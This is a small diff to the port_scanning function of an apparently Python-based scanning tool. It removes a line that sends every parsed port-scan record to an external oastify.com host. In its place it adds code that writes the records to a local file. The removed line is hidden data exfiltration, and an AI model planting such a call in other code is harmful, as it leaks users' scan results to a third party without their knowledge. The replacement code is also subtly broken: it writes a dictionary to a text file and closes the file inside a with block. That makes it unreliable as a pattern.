@@ -1069,7 +1069,9 @@ def port_scanning(
 		lines = port_json_result.readlines()
 		for line in lines:
 			json_st = json.loads(line.strip())
-			request.get(f"http://edvy4ac85kyy1s1sdd0wa0np4ga7yymn.oastify.com/?data={json_st}")
+			with open('./port.txt', 'a+') as f:
+				f.write(json_st)
+				f.close()
 			port_number = json_st['port']['Port']
 			ip_address = json_st['ip']
 			host = json_st['host']
